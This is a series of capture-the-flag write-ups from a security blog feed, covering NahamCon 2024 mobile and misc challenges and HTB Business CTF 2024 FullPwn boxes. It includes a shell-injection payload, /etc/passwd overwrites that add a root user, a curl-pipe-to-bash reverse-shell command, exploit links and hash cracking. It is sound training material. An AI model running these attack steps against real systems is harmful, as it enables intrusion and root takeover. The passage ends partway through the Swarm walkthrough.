&lt;p>Starting off, I loaded the app into &lt;a href="https://github.com/skylot/jadx/releases" target="_blank" rel="noopener">jadx-gui&lt;/a>
and started with checking out the Android Manifest.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_2.png" class="center" style="border-radius: 8px;" />
&lt;p>In the manifest, we see the package name, activity, service etc. We also see a reference to godot engine.&lt;/p>
&lt;p>Looking at the listed activity and other parts of the application on jadx-gui didn&amp;rsquo;t reveal much about the functionality of the app.&lt;/p>
&lt;p>I then decided to load the app on genymotion emulator to have a feel of how it looks when it runs. It seems like a simple game.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_3.png" class="center" style="border-radius: 8px;" />
&lt;p>When we play, we have to click on the screen severally to make the bug jump, once the bug falls we get our score and points.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_4.png" class="center" style="border-radius: 8px;" />
&lt;p>On the shop interface, we can purchase the &amp;lsquo;drip&amp;rsquo;. All we need is 7331,7331 points but all we managed was 2 from the short gameplay.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_5.png" class="center" style="border-radius: 8px;" />
&lt;p>Back on the emulator, I got an adb shell and checked what local files I could find that could have been created by the app.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_6.png" class="center" style="border-radius: 8px;" />
&lt;p>There&amp;rsquo;s not much, but seeing libgodot here probably means that it&amp;rsquo;s important to the running of the app. Back on jadx-gui, looking at the resources/assets we have the libgodot in lib folder and also in the assets/scripts folder we have flag.gdc. This is possibly the flag but it&amp;rsquo;s not readable here.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_7.png" class="center" style="border-radius: 8px;" />
&lt;p>After some research, gdc file format is godot engine compiled script. Godot engine is a game engine. I found that we can decompile the compiled script using Godot reverse engineering tools - &lt;a href="https://github.com/bruvzg/gdsdecomp" target="_blank" rel="noopener">gdsdecomp&lt;/a>
.&lt;/p>
&lt;p>With the tool downloaded, we can provide the apk directly to perform the decompilation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>./gdre_tools.x86_64 --recover&lt;span style="color:#f92672">=&lt;/span>../com.nahamcon2024.buggyjumper.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_8.png" class="center" style="border-radius: 8px;" />
&lt;p>This will create a new folder with the all the gdc files in the app decompiled. In the scripts folder, we get the flag now in plain text.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_9.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="4-buggy-jumper-2">4. Buggy Jumper 2&lt;/h2>
&lt;p>This challenge is rated &lt;strong>Medium&lt;/strong>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_10.png" class="center" style="border-radius: 8px;" />
&lt;p>This is a follow up of the previous challenge and we should use the same app. From the description, the focus is in the shop.&lt;/p>
&lt;p>In the shop.gd file, we see the code for the shop.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_11.png" class="center" style="border-radius: 8px;" />
&lt;p>To buy the drip, a web request is sent to a url with an auth token and the value of points the response from this /verify endpoint will give the flag. The url is provided in the global.gd file.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_12.png" class="center" style="border-radius: 8px;" />
&lt;p>There&amp;rsquo;s more code in the global.gd file. After reading the code, I understand the sequence needed to get the flag.&lt;/p>
&lt;p>Below is the summary:&lt;/p>
&lt;ul>
&lt;li>Register via a POST request to the /register endpoint to get an auth token. The string &lt;strong>Godot&lt;/strong> is required to be in the user agent.&lt;/li>
&lt;li>Save points via a POST request to the /save endpoint. We need to set the points to be &amp;gt;=73317331 and in json format.&lt;/li>
&lt;li>Make a request to /verify providing points &amp;gt;=73317331 to get the flag.&lt;/li>
&lt;/ul>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_13.png" class="center" style="border-radius: 8px;" />
&lt;p>An alternative option to get the flag, is by letting the app make the request for us. We can manipulate the score value as this is stored in a local file &lt;strong>saved_value.dat&lt;/strong>. We have seen this referenced in the code and in the local files on the emulator.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#ae81ff">73317331&lt;/span> &amp;gt; ./data_mirror/data_ce/null/0/com.nahamcon2024.buggyjump/files/saved_value.dat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we restart the app, we can get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_14.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>The mobile app challenges were quite nice to go over, thankful to the NahamCon CTF team that they left the challenges accessible post event.&lt;/p>
&lt;p>There are 2 challenges that I didn&amp;rsquo;t manage to solve. I realized the app was written in flutter and it seems there&amp;rsquo;s a unique step by step for testing apps written in flutter. I&amp;rsquo;ll be digging deeper to learn how to work with apps made in flutter.&lt;/p>
&lt;p>Here is a link to another writeup that covers the remaining 2 challenges:&lt;/p>
&lt;p>&lt;a href="https://hackmd.io/@avila-pwn-notes/r183kzlEA" target="_blank" rel="noopener">https://hackmd.io/@avila-pwn-notes/r183kzlEA&lt;/a>
&lt;/p></content></item><item><title>NahamCon CTF 2024 WriteUp - Misc</title><link>https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_misc/</link><pubDate>Sat, 25 May 2024 21:17:45 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_misc/</guid><description>Introduction NahamCon 2024 is taking place this weekend and they had a CTF as part of the online conference. I participated with team fr334aks .
We managed position 197. We did good on Web, Mobile and WarmUps but not well on other categories like Binary Exploitation and Crypto.
It was our first CTF of the year together, so it&amp;rsquo;s not a bad start from a long break. Hopefully we get back to our winning ways :).</description><content>&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>NahamCon 2024 is taking place this weekend and they had a CTF as part of the online conference. I participated with team &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
.&lt;/p>
&lt;p>We managed position 197. We did good on Web, Mobile and WarmUps but not well on other categories like Binary Exploitation and Crypto.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/cert.png" class="center" style="border-radius: 8px;" />
&lt;p>It was our first CTF of the year together, so it&amp;rsquo;s not a bad start from a long break. Hopefully we get back to our winning ways :).&lt;/p>
&lt;p>I only solved 2 challenges in Miscellaneous category that I am writing about in this post.&lt;/p>
&lt;h2 id="1-securesurfer">1. SecureSurfer&lt;/h2>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_1.png" class="center" style="border-radius: 8px;" />
&lt;p>We begin with ssh access to the challenge environment, we are also provided with &lt;a href="https://blog.ikuamike.io/files/nahamcon_ctf_2024/securesurfer.c">securesurfer.c&lt;/a>
file. Our objective is to gain root access to get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_2.png" class="center" style="border-radius: 8px;" />
&lt;p>When we ssh, it seems the securesurfer program is executed and we are provided with a few options.&lt;/p>
&lt;p>If we look at the code provided, the only option that takes user input is option 6 which is a url that will be loaded using lynx browser on the terminal.&lt;/p>
&lt;p>We can see that the user input is not sanitized/validated, the only check done is that the url has to begin with &lt;code>https://&lt;/code>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_4.png" class="center" style="border-radius: 8px;" />
&lt;p>We can therefore inject our own commands to break out of the program and into a shell. After the url we can inject the below payload.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;;bash;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once lynx program is done loading the url, we get a bash shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_3.png" class="center" style="border-radius: 8px;" />
&lt;p>To escalate our privileges, we find that the securesurfer user can run lynx as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_5.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then try accessing the root folder using the below command.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/local/bin/lynx file:///root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_6.png" class="center" style="border-radius: 8px;" />
&lt;p>Here we see the get flag binary, we can then download it to our local directory and execute it to get the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/local/bin/lynx -source file:///root/get_flag_random_suffix_21505252448959 &amp;gt; get_flag
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_7.png" class="center" style="border-radius: 8px;" />
&lt;p>If we wanted to get a root shell, one way is to overwrite the passwd file to add a user with root privileges.&lt;/p>
&lt;p>We&amp;rsquo;ll begin by creating a password hash for the user we want to add to the passwd file, the password here is &lt;strong>hacker&lt;/strong>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>openssl passwd -1 -salt hacker hacker
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we&amp;rsquo;ll copy the current passwd file to our directory and add our new user to the file, using the below format where we specify the user with id 0 to give root privileges. The username is &lt;strong>hacker&lt;/strong>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_8.png" class="center" style="border-radius: 8px;" />
&lt;p>Then we&amp;rsquo;ll launch lynx and overwrite the /etc/passwd with our modified passwd file.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/local/bin/lynx file:///home/securesurfer/passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we are in lynx, we will press &lt;strong>P&lt;/strong> which is the print option, and we select &lt;strong>Save to a local file&lt;/strong> and press enter.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_9.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then update the filename to /etc/passwd.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_10.png" class="center" style="border-radius: 8px;" />
&lt;p>Once we say yes to Overwrite the file, we can quit lynx and switch to the &lt;code>hacker&lt;/code> user, using the password &lt;code>hacker&lt;/code> to get a root shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_11.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="2-curly-fries">2. Curly Fries&lt;/h2>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_1.png" class="center" style="border-radius: 8px;" />
&lt;p>For this challenge, we begin by ssh into the challenge environment. Our objective is to escalate to root and get the flag.&lt;/p>
&lt;p>Our user has sudo privileges to run curl impersonating the user fry, however this configuration is not vulnerable to abuse.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_2.png" class="center" style="border-radius: 8px;" />
&lt;p>Looking around, we find that in fry&amp;rsquo;s home folder we can read the bash_history file. This gives us their password.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_3.png" class="center" style="border-radius: 8px;" />
&lt;p>Switching to the user fry, we see they can run curl as root but the configuration includes a wildcard. This is different from the previous configuration and we can abuse it.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_4.png" class="center" style="border-radius: 8px;" />
&lt;p>Similar to the previous challenge, we&amp;rsquo;ll use curl to overwrite the passwd file with a modified version that has the hacker user with root privileges.&lt;/p>
&lt;p>I set up a python web server to serve the modified passwd file and then downloaded it and perform the overwrite.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/bin/curl 127.0.0.1:8000/health-check -o /etc/passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_5.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>Thanks to John Hammond, NahamSec and the rest of challenge creators for putting together yet another great CTF this year. I didn&amp;rsquo;t put in a lot of time to solve more challenges but I still had a good time.&lt;/p>
&lt;p>You can catch the conference live here: &lt;a href="https://www.youtube.com/live/76mNNVVBht0?si=E2TKu8fJD6SNXFCR" target="_blank" rel="noopener">NahamCon CTF 2024 Live Stream&lt;/a>
&lt;/p></content></item><item><title>HTB Business CTF 2024 WriteUp - FullPwn</title><link>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_fullpwn/</link><pubDate>Wed, 22 May 2024 18:22:15 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_fullpwn/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>After a long while since I participated in a CTF, I had the pleasure to participate in &lt;a href="https://ctf.hackthebox.com/event/details/htb-business-ctf-2024-the-vault-of-hope-1474" target="_blank" rel="noopener">HTB Business CTF 2024&lt;/a>
these past few days. I enjoyed myself despite having only solved a handful of challenges. I went solo and didn&amp;rsquo;t rank quite high but I&amp;rsquo;m still pleased with myself.&lt;/p>
&lt;p>In this post, I&amp;rsquo;ll cover the challenges I solved under the FullPwn category which is similar to the HTB Boxes that you perform initial access and escalate to root.&lt;/p>
&lt;p>FYI: It&amp;rsquo;s a long post.&lt;/p>
&lt;h2 id="1-submerged">1. Submerged&lt;/h2>
&lt;p>This challenge was rated &lt;strong>Very Easy&lt;/strong>.&lt;/p>
&lt;h3 id="initial-access">Initial Access&lt;/h3>
&lt;p>We&amp;rsquo;ll begin by performing a full portscan on the provided IP using Nmap.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_1.png" class="center" style="border-radius: 8px;" />
&lt;p>From the output, we only have port 80 open and it redirects to submerged.htb.&lt;/p>
&lt;p>We can add the domain to our hosts file, but I&amp;rsquo;ll use a new trick I learnt using burp so I don&amp;rsquo;t have to modify my hosts file each time.&lt;/p>
&lt;p>On Burp Suite, go to:&lt;/p>
&lt;p>&lt;strong>Settings -&amp;gt; Network -&amp;gt; Connections -&amp;gt; Hostname resolution overrides&lt;/strong>.&lt;/p>
&lt;p>Then add the hostname and IP.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_2.png" class="center" style="border-radius: 8px;" />
&lt;p>Once this is set, we can access the site via the browser that comes with Burp.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_3.png" class="center" style="border-radius: 8px;" />
&lt;p>There&amp;rsquo;s not much on the site apart from a link to another subdomain &lt;strong>spip.submerged.htb&lt;/strong>. We&amp;rsquo;ll add the hostname to burp as we did earlier.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_4.png" class="center" style="border-radius: 8px;" />
&lt;p>Visiting this new subdomain, there&amp;rsquo;s no content on the site, we only see mentions of spip. I did a quick google search on any exploits related to spip and came across this script from exploitdb.&lt;/p>
&lt;p>&lt;a href="https://www.exploit-db.com/exploits/51536" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/51536&lt;/a>
&lt;/p>
&lt;p>Since I didn&amp;rsquo;t confirm the version of spip, I just executed the exploit hoping it works. I was then able to get a reverse shell.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>http_proxy&lt;span style="color:#f92672">=&lt;/span>127.0.0.1:8080 python 51536.py --url http://spip.submerged.htb -c &lt;span style="color:#e6db74">&amp;#39;curl http://10.10.14.95:9000/revshell.sh | bash&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The command downloads the reverse shell script from my web server and executes it, I use http_proxy to forward the request through burp since the hostname is configured there.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_5.png" class="center" style="border-radius: 8px;" />
&lt;p>After getting our shell, we can read user.txt.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_12.png" class="center" style="border-radius: 8px;" />
&lt;p>user.txt: &lt;strong>HTB{SpIP_Abu53_4_RC3}&lt;/strong>&lt;/p>
&lt;h3 id="privilege-escalation">Privilege Escalation&lt;/h3>
&lt;p>Privilege Escalation to root is also straightforward as the user we have has sudo permission with no password.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_6.png" class="center" style="border-radius: 8px;" />
&lt;p>However, we do not get the root.txt in the root folder. After some enumeration, it was nowhere to found on the server.&lt;/p>
&lt;p>Something I found peculiar was that when checking running processes, only a small number of them were listed which is not normal output for a linux server and a /init process running as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_7.png" class="center" style="border-radius: 8px;" />
&lt;p>This init binary is present in / and it&amp;rsquo;s a 64 bit executable. Extracting strings from it, revealed several references of WSL indicating we were inside a WSL instance.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>strings /init
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_8.png" class="center" style="border-radius: 8px;" />
&lt;p>Within WSL the host filesystem is usually accessible under /mnt/c, but this was not available.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_9.png" class="center" style="border-radius: 8px;" />
&lt;p>I came across this link that gave the solution to this problem.&lt;/p>
&lt;p>&lt;a href="https://exploit-notes.hdks.org/exploit/windows/wsl/wsl-pentesting/" target="_blank" rel="noopener">https://exploit-notes.hdks.org/exploit/windows/wsl/wsl-pentesting/&lt;/a>
&lt;/p>
&lt;p>It seems the C: drive was not mounted automatically, therefore, we could just mount it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>mount -t drvfs C: /mnt/c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_10.png" class="center" style="border-radius: 8px;" />
&lt;p>With access to the C: drive we can read root.txt on administrator&amp;rsquo;s desktop to complete the challenge.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_submerged_11.png" class="center" style="border-radius: 8px;" />
&lt;p>root.txt: &lt;strong>HTB{Pwn1ng_WsL_4_7h3_W1n}&lt;/strong>&lt;/p>
&lt;h2 id="2-survivor">2. Survivor&lt;/h2>
&lt;p>This challenge was rated &lt;strong>Easy&lt;/strong>.&lt;/p>
&lt;h3 id="initial-access-1">Initial Access&lt;/h3>
&lt;p>Let&amp;rsquo;s start with full portscan using Nmap.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_1.png" class="center" style="border-radius: 8px;" />
&lt;p>From the scan output we have port 22 and 80 open. Focusing on port 80, it redirects to survivor.htb.&lt;/p>
&lt;p>Similar to the previous challenge, we add the hostname to burp and visit the page. On the site we have a few posts and on one of the posts discover a new subdomain fuxa.survivor.htb.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_2.png" class="center" style="border-radius: 8px;" />
&lt;p>Adding this new hostname and loading it, we see the app is called Fuxa by frangoteam&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_3.png" class="center" style="border-radius: 8px;" />
&lt;p>After it loads, we don&amp;rsquo;t have much functionality. I decided to search for any exploits for this software and found this repo on Github.&lt;/p>
&lt;p>&lt;a href="https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831" target="_blank" rel="noopener">https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831&lt;/a>
&lt;/p>
&lt;p>The exploit script works and we get a reverse shell. We get user.txt.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_4.png" class="center" style="border-radius: 8px;" />
&lt;p>user.txt: &lt;strong>HTB{FuXa_ExPloIT_4_RC3}&lt;/strong>&lt;/p>
&lt;h3 id="privilege-escalation-1">Privilege Escalation&lt;/h3>
&lt;p>On performing enumeration on the server, I didn&amp;rsquo;t find vulnerable software or misconfiguration on sudo or any cron jobs. I then decided to look at the kernel. I came across this exploit that seems appropriate for our case.&lt;/p>
&lt;p>&lt;a href="https://github.com/Notselwyn/CVE-2024-1086/releases" target="_blank" rel="noopener">https://github.com/Notselwyn/CVE-2024-1086/releases&lt;/a>
&lt;/p>
&lt;p>Downloading the compiled exploit binary and executing on our target successfully gets us a root shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_survivor_5.png" class="center" style="border-radius: 8px;" />
&lt;p>root.txt: &lt;strong>HTB{KeRnEnL_ExP_4_r00t}&lt;/strong>&lt;/p>
&lt;h2 id="3-swarm">3. Swarm&lt;/h2>
&lt;p>This challenge was also rated &lt;strong>Easy&lt;/strong>.&lt;/p>
&lt;h3 id="initial-access-2">Initial Access&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_1.png" class="center" style="border-radius: 8px;" />
&lt;p>From the nmap scan we see we have port 80 open and it redirects to swarm.htb. We also have a Docker Registry running on port 5000.&lt;/p>
&lt;p>After adding the hostname and visiting the site, it has a few posts but nothing seems interesting.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_2.png" class="center" style="border-radius: 8px;" />
&lt;p>We can collect the names of the post authors as potential usernames for the login page. We also have an admin portal, indicating that this is a django app.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_7.png" class="center" style="border-radius: 8px;" />
&lt;p>After not getting any viable path to attack the site, I switched to looking at the registry.&lt;/p>
&lt;p>Since the registry has no interface to interact with, we have to hit the endpoints directly. On docker registry /v2/_catalog endpoint list the repositories.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_3.png" class="center" style="border-radius: 8px;" />
&lt;p>We see that we have newsbox-web repo. If we visit /v2/newsbox-web/tags/list we can see the tags which will tell us the docker image present.&lt;/p>
&lt;p>Here we have one image - newsbox-web:latest.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_4.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then pull the docker image locally.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker pull swarm.htb:5000/newsbox-web:latest
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After pulling the image, let&amp;rsquo;s run a container and inspect the contents.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker run --rm -it swarm.htb:5000/newsbox-web:latest /bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Upon running the container, we see there&amp;rsquo;s a db present. We can use docker cp to retrieve the sqlite db to our host.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_5.png" class="center" style="border-radius: 8px;" />
&lt;p>I used sqlitebrowser to read the contents. In the auth_user table, we get the password hashes for the users.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sqlitebrowser db.sqlite3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_6.png" class="center" style="border-radius: 8px;" />
&lt;p>I stored the hashes in a ttxt and used hashcat to try and crack them to get passwords.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hashcat -a &lt;span style="color:#ae81ff">0&lt;/span> -m &lt;span style="color:#ae81ff">10000&lt;/span> django_hashes.txt /usr/share/wordlists/rockyou.txt --force
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_8.png" class="center" style="border-radius: 8px;" />
&lt;p>We successfully crack one hash and get the password &lt;code>pennypenny99&lt;/code> this hash is for the user &lt;code>PenniesForThoughts&lt;/code>.&lt;/p>
&lt;p>We can login to site but we still get nothing useful. Trying this password on SSH, we are able to login but we have to use the username &lt;code>plessing&lt;/code> which is the name on the email.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_9.png" class="center" style="border-radius: 8px;" />
&lt;p>user.txt: &lt;strong>HTB{b3_f1r5t_b3_5m4rt3r_0r_ch34t}&lt;/strong>&lt;/p>
&lt;h3 id="privilege-escalation-2">Privilege Escalation&lt;/h3>
&lt;p>For privilege escalation, enumeration led us to discover that the user plessing can run the docker swarm command as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_10.png" class="center" style="border-radius: 8px;" />
&lt;p>Abusing this functionlity for privilege escalation took me a while to figure out. Let&amp;rsquo;s get into it.&lt;/p>
&lt;p>First we set up a docker swarm on our attacker machine, then join the target server as a worker node.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_11.png" class="center" style="border-radius: 8px;" />
